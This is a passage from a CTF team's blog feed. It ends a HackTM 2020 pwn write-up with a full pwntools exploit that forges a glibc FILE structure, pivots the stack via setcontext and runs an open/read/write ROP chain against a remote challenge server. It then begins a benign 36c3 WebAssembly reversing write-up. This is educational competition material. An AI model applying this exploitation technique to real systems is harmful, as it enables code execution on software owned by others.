INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_HELPER_JUMPS) <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_) <span class="comment"># stderr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># stdout</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># stdin</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(len(ROP_CHAIN))</span></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*(<span class="number">0x1f</span>*<span class="number">8</span>) <span class="comment"># __elf_set___libc_subfreeres</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># vtable IO_HELPER_JUMPS</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(SETCONTEXT_SPITVOT) <span class="comment"># _IO_helper_jumps STACKPIVOT SETCONTEXT</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    setcontext+0x35</span></span><br><span class="line"><span class="string">    mov     rsp, [rdx+0A0h]</span></span><br><span class="line"><span class="string">    mov     rbx, [rdx+80h]</span></span><br><span class="line"><span class="string">    mov     rbp, [rdx+78h]</span></span><br><span class="line"><span class="string">    mov     r12, [rdx+48h]</span></span><br><span class="line"><span class="string">    mov     r13, [rdx+50h]</span></span><br><span class="line"><span class="string">    mov     r14, [rdx+58h]</span></span><br><span class="line"><span class="string">    mov     r15, [rdx+60h]</span></span><br><span class="line"><span class="string">    mov     rcx, [rdx+0A8h]</span></span><br><span class="line"><span class="string">    push    rcx</span></span><br><span class="line"><span class="string">    mov     rsi, [rdx+70h]</span></span><br><span class="line"><span class="string">    mov     rdi, [rdx+68h]</span></span><br><span class="line"><span class="string">    mov     rcx, [rdx+98h]</span></span><br><span class="line"><span class="string">    mov     r8, [rdx+28h]</span></span><br><span class="line"><span class="string">    mov     r9, [rdx+30h]</span></span><br><span class="line"><span class="string">    mov     rdx, [rdx+88h]</span></span><br><span class="line"><span class="string">    xor     eax, eax</span></span><br><span class="line"><span class="string">    retn</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    POPRAX = LIBC + <span class="number">0x0000000000047cf8</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">    POPRDI = LIBC + <span class="number">0x0000000000026542</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    POPRDX = LIBC + <span class="number">0x000000000012bda6</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    POPRSI = LIBC + <span class="number">0x0000000000026f9e</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">    SYSCALL = LIBC + <span class="number">0x00000000000cf6c5</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">    </span><br><span class="line">    FLAG_PATH = _IO_HELPER_JUMPS+<span class="number">0x178</span><span class="comment">#LIBC+0x1baad8#+16*8</span></span><br><span class="line">    ROP_ADDR = _IO_HELPER_JUMPS+<span class="number">0xa8</span><span class="comment">#LIBC+0x1baa08</span></span><br><span class="line">    ROP_CHAIN = p64(POPRAX)*<span class="number">2</span><span class="comment">#p64(OPEN)</span></span><br><span class="line">    ROP_CHAIN += p64(<span class="number">2</span>) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(<span class="number">0</span>) + p64(SYSCALL) <span class="comment"># OPEN(file=flag_path) syscall == 2</span></span><br><span class="line">    ROP_CHAIN += p64(POPRAX) + p64(<span class="number">0</span>) + p64(POPRDI) + p64(<span class="number">3</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0</span></span><br><span class="line">    ROP_CHAIN += p64(POPRAX) + p64(<span class="number">1</span>) + p64(POPRDI) + p64(<span class="number">1</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1</span></span><br><span class="line">    ROP_CHAIN += <span class="string">"flag\x00"</span></span><br><span class="line">    <span class="comment">#ROP_CHAIN = ''</span></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(ROP_ADDR)+ ROP_CHAIN <span class="comment">#+ '\x00'*(190+7+3) + ROP_CHAIN#+ '\x00'*(0x90-0x88+0x8)+ p64(LIBC)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#INPUT2 += p64(0)*16*2 # _nl_global_locale</span></span><br><span class="line">    r.sendlineafter(<span class="string">'1 : '</span>, <span class="string">"%x %x"</span> %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+<span class="number">0x2000</span>))</span><br><span class="line">    r.sendafter(<span class="string">'2 : '</span>, INPUT2)</span><br><span class="line">    <span class="comment">#r.interactive()</span></span><br><span class="line">    flag = r.recvall(timeout=<span class="number">2</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'HackTM'</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python trip_to_trick.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/trip_to_trick'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 138.68.67.161 on port 20006: Done</span><br><span class="line">[*] SYSTEM 0x7f1c8b934fd0</span><br><span class="line">[*] LIBC 0x7f1c8b8e2000</span><br><span class="line">[+] Receiving all data: Done (73B)</span><br><span class="line">[*] Closed connection to 138.68.67.161 port 20006</span><br><span class="line">HackTM&#123;d747aab3b6d6a95300eede7e3337397ace5131240e0fa9b849058f27f635e182&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/</a></li><li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li><li><a href="http://blog.angelboy.tw/" target="_blank" rel="noopener">http://blog.angelboy.tw/</a></li><li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></li><li><a href="https://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="noopener">https://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Trip To Trick   &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;492 Points   &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/str
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="IO_FILE" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"/>
    
    
      <category term="file_stream" scheme="https://teamrocketist.github.io/tags/file-stream/"/>
    
      <category term="io_file" scheme="https://teamrocketist.github.io/tags/io-file/"/>
    
      <category term="io_file_struct" scheme="https://teamrocketist.github.io/tags/io-file-struct/"/>
    
      <category term="hacktm2020" scheme="https://teamrocketist.github.io/tags/hacktm2020/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 36c3 - xmas_future</title>
    <link href="https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/"/>
    <id>https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/</id>
    <published>2019-12-30T03:02:38.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>xmas_future</strong></p><p><strong>Points</strong><br>96<br><strong>Solves</strong><br>95<br><strong>Category</strong><br>Reverse</p><p><strong>Description:</strong><br>Most people just give you a present for christmas, hxp gives you a glorious future.</p><p>If you’re confused, simply extract the flag from this 山葵 and you shall understand. :)<br><a href="https://mega.nz/#!3nAGhAbI!qtxumnnsCsI9N6KUPCyEuatHVR9tm-uR8hKn6m8i9cc" target="_blank" rel="noopener">xmas_future-265eb0be46555aad.tar.xz (15.5 KiB)</a><br>by benediktwerner</p></blockquote><p>So we are given a bunch of html/wasm file, after running the php web server with the <strong>run.sh</strong> file we are presented with a page:<br><a data-fancybox="gallery" href="https://i.imgur.com/iaHhnaz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iaHhnaz.png" alt><br></a><br>The system will say the flag was correct if we insert the right flag, so let’s inspect the source:<br><a data-fancybox="gallery" href="https://i.imgur.com/BS3pITw.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BS3pITw.png" alt><br></a><br>Next step is to check hxp2019.js:<br><a data-fancybox="gallery" href="https://i.imgur.com/IoJNl3l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IoJNl3l.png" alt><br></a><br>Check function is located at the WebAssembly file and its parameters are, the pointer <strong>offset</strong> to the string and the <strong>length</strong> of the string.</p><p>Instead of debugging the file through <strong>OP_CODES</strong> in the browser I found a <a href="https://github.com/WebAssembly/wabt" target="_blank" rel="noopener">tool</a> that can <strong>decompile</strong> it and also <strong>convert</strong> it to a <strong>c</strong> file.</p><p>After cloning the repo I followed the instructions on <strong>readme</strong> to build and compile the project:</p><p>After building everything <strong>new</strong> executables are added to the <strong>bin/</strong> folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls bin/</span><br><span class="line">spectest-interp*  wasm2wat*        wasm-interp*   wasm-opcodecnt*  wasm-validate*  wat2wasm*</span><br><span class="line">wasm2c*           wasm-decompile*  wasm-objdump*  wasm-strip*      wast2json*      wat-desugar*</span><br></pre></td></tr></table></figure><p>First I decompiled the file using <strong>wasm-decompile</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ../../challenge</span><br><span class="line">$ ./wasm-decompile ../../hxp2019_bg.wasm -o ../../challenge/dec.js</span><br></pre></td></tr></table></figure></p><p>And now lets convert also to <strong>c</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./wasm2c ../../hxp2019_bg.wasm -o ../../challenge/hxp2019_bg.c</span><br></pre></td></tr></table></figure><p>Lets see the new files created:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../../challenge</span><br><span class="line">$ ls</span><br><span class="line">decompiled.js  hxp2019_bg.c  hxp2019_bg.h</span><br></pre></td></tr></table></figure><p>Lets start first with the decompiled file which is a lot easier to read:<br><a data-fancybox="gallery" href="https://i.imgur.com/IY0xCgC.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IY0xCgC.png" alt><br></a><br>Looking at the <strong>hxp2019_check_h578f31d490e10a31</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/XcWuAr5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XcWuAr5.png" alt><br></a><br>Checking the verifications of the rest of the characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/hgQ1IqR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/hgQ1IqR.png" alt><br></a><br>Now that we know what is going on, we can start to look where the final check is located in the c generated files, so we can do dynamic analysis with gdb…</p><p>First let’s fix some wrong paths at <strong>hxp2019_bg.c</strong>  from: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../../challenge/hxp2019_bg.h"</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>To:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"hxp2019_bg.h"</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>The function in <strong>c</strong> is named <strong>hxp2019__check__h578f31d490e10a31</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">hxp2019__check__h578f31d490e10a31</span><span class="params">(u32 p0, u32 p1)</span> </span>&#123;</span><br><span class="line">  u32 l2 = <span class="number">0</span>, l3 = <span class="number">0</span>, l4 = <span class="number">0</span>, l5 = <span class="number">0</span>, l6 = <span class="number">0</span>, l7 = <span class="number">0</span>, l8 = <span class="number">0</span>, l9 = <span class="number">0</span>, </span><br><span class="line">      l10 = <span class="number">0</span>;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 i0, i1, i2;</span><br><span class="line">  ...</span><br><span class="line">  i1 &amp;= i2;</span><br><span class="line">  i0 = i0 == i1; <span class="comment">// final check is here we might want to put a breakpoint here.</span></span><br><span class="line">  <span class="keyword">if</span> (i0) &#123;<span class="keyword">goto</span> L7;&#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Putting a <strong>break point</strong> there is a solution but this makes a lot of <strong>effort</strong> to make the conditions always true and check the correct character. </p><p>We could also write a <strong>gdbscript</strong> or <strong>r2script</strong> but once again takes a lot of time… </p><p>Since this <strong>c</strong> files are compilable we can just modify the source code to print the flag characters and turn this condition to always return true.</p><p>But first we need to learn how to compile this kind of auto generated files, an example can be found at the <strong>wabt</strong> directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dependencies</span></span><br><span class="line">$ ls ../wabt/wasm2c/</span><br><span class="line">wasm-rt.h  wasm-rt-impl.c  wasm-rt-impl.h</span><br><span class="line">$ cp ../wabt/wasm2c/wasm-rt.h .</span><br><span class="line">$ cp ../wabt/wasm2c/wasm-rt-impl.c .</span><br><span class="line">$ cp ../wabt/wasm2c/wasm-rt-impl.h .</span><br><span class="line"><span class="comment"># Copying fac example files</span></span><br><span class="line">$ ls ../wabt/wasm2c/examples/fac/</span><br><span class="line">fac.c  fac.h  fac.wasm  fac.wat  main.c</span><br><span class="line">$ cp ../wabt/wasm2c/examples/fac/* .</span><br><span class="line">$ rm fac.c fac.h fac.wasm</span><br></pre></td></tr></table></figure><p>Now looking at the example of <strong>main.c</strong> file from <strong>fac</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Uncomment this to define fac_init and fac_Z_facZ_ii instead. */</span></span><br><span class="line"><span class="comment">/* #define WASM_RT_MODULE_PREFIX fac_ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fac.h"</span> <span class="comment">// Change this to hxp2019_bg.h</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Make sure there is at least one command-line argument. */</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert the argument from a string to an int. We'll implictly cast the int</span></span><br><span class="line"><span class="comment">  to a `u32`, which is what `fac` expects. */</span></span><br><span class="line">  u32 x = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize the fac module. Since we didn't define WASM_RT_MODULE_PREFIX,</span></span><br><span class="line"><span class="comment">  the initialization function is called `init`. */</span></span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call `fac`, using the mangled name. */</span></span><br><span class="line">  u32 result = Z_facZ_ii(x); <span class="comment">// We need to change this function too the real name is located at hxp2019_bg.h</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print the result. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fac(%u) -&gt; %u\n"</span>, x, result);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>As you can see we need to adapt the example main function the current file we want to debug to find the correct <strong>Z_xxxZ</strong> function we can look at the header file generated <strong>hxp2019_bg.h</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NwwTba7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NwwTba7.png" alt><br></a><br>The adapted main.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Uncomment this to define fac_init and fac_Z_facZ_ii instead. */</span></span><br><span class="line"><span class="comment">/* #define WASM_RT_MODULE_PREFIX fac_ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"hxp2019_bg.h"</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">b hxp2019_bg.c:2268</span></span><br><span class="line"><span class="comment">b hxp2019_bg.c:2434</span></span><br><span class="line"><span class="comment">r 1048576 50</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Make sure there is at least one command-line argument. */</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert the argument from a string to an int. We'll implictly cast the int</span></span><br><span class="line"><span class="comment">  to a `u32`, which is what `fac` expects. */</span></span><br><span class="line">  u32 x = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  u32 y = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize the fac module. Since we didn't define WASM_RT_MODULE_PREFIX,</span></span><br><span class="line"><span class="comment">  the initialization function is called `init`. */</span></span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call `fac`, using the mangled name. */</span></span><br><span class="line">  u32 result = Z_checkZ_iii(x,y); <span class="comment">// 1048576 50</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print the result. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"check(%u,%u) -&gt; %u\n"</span>, x,y, result);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s use gcc to compile everything:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -ggdb wasm-rt-impl.c -o wasm-rt-impl.o -c</span><br><span class="line">$ gcc -m32 -ggdb hxp2019_bg.c -o hxp2019_bg.o -c</span><br><span class="line">$ gcc -m32 -ggdb main.c -o main.o -c</span><br><span class="line"><span class="comment"># linking everything</span></span><br><span class="line">$ gcc -m32 -ggdb -o main main.o hxp2019_bg.o wasm-rt-impl.o</span><br><span class="line">$ ./main 1048576 50</span><br><span class="line">check(1048576,50) -&gt; 0</span><br></pre></td></tr></table></figure></p><p>Generating a make file so we don’t have to repeat ourselfs over and over:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">CFLAGS=-I. -ggdb -m32</span><br><span class="line">DEPS = hxp2019_bg.h wasm-rt.h wasm-rt-impl.h</span><br><span class="line">OBJ = hxp2019_bg.o wasm-rt-impl.o main.o</span><br><span class="line"></span><br><span class="line">%.o: %.c $(DEPS)</span><br><span class="line">$(CC) -c -o <span class="variable">$@</span> $&lt; $(CFLAGS)</span><br><span class="line"></span><br><span class="line">main: $(OBJ)</span><br><span class="line">$(CC) -o <span class="variable">$@</span> $^ $(CFLAGS)</span><br><span class="line">clean:</span><br><span class="line">rm *.o</span><br><span class="line">rm -f main</span><br></pre></td></tr></table></figure><p>Now we just need do <strong>make clean</strong> and make to compile everything:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ make clean</span><br><span class="line">rm *.o</span><br><span class="line">rm -f main</span><br><span class="line">$ make</span><br><span class="line">gcc -c -o hxp2019_bg.o hxp2019_bg.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o wasm-rt-impl.o wasm-rt-impl.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o main.o main.c -I. -ggdb -m32</span><br><span class="line">gcc -o main hxp2019_bg.o wasm-rt-impl.o main.o -I. -ggdb -m32</span><br></pre></td></tr></table></figure><p>Note that the flag <strong>-m32</strong> is to compile the binary in 32 bits and the <strong>-ggdb</strong> is to add symbols to gdb so we can debug everything and watch the source code instead of only viewing the assembly :).</p><p>Now advancing to change <strong>hxp2019_bg.c</strong> file to print us the flag on execution we need to populate the input string before doing the checks, also that loop we investigated before is only doing the checks inside of the flag brackets <strong>hxp{…}</strong>, the rest of the flag is being checked somewhere else in the code, we don’t really need to know where, we just need to populate the begining and the end with the right characters and the rest with As…</p><p>Let’s do a function that does that:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">populate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">0</span>] = <span class="string">'h'</span>; <span class="comment">// i32_store((&amp;memory), (u64)(1048576u + 0), 'h');</span></span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">1</span>] = <span class="string">'x'</span>;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">2</span>] = <span class="string">'p'</span>;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">3</span>] = <span class="string">'&#123;'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">4</span>; i &lt; <span class="number">49</span>; ++i) &#123;</span><br><span class="line">    memory.data[<span class="number">1048576u</span>+i] = <span class="string">'A'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">49</span>] = <span class="string">'&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We add this call before the check call at <strong>static u32 